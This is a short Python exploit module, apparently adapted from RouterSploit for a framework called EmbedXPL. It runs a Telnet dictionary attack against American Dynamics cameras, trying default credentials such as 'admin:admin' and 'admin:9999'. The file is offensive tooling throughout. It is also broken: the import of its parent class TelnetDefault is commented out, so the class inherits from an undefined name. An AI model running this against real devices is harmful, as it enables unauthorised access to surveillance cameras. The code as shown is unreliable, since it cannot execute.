# Absorbed from RouterSploit — rewritten for EmbedXPL v5.0.0
# Original authors preserved in __info__["authors"]
# EmbedXPL adaptation: André Henrique (@mrhenrike) | União Geek

from embedxpl.core.exploit import *
# SKIPPED: # FIXED: from routersploit.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "American Dynamics Default Telnet Creds",
        "description": "Module performs dictionary attack against American Dynamics Telnet service. "
                       "If valid credentials are found, they are displayed to te user.",
        "authors": (
            "EmbedXPL absorption: André Henrique (@mrhenrike) | União Geek",
# SKIPPED:             "Marcin Bury <marcin[at]threat9.com",  # routersploit module
        ),
        "devices": (
            "American Dynamics Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("admin:admin,admin:9999", "User:Pass or file with default credentials (file://)")
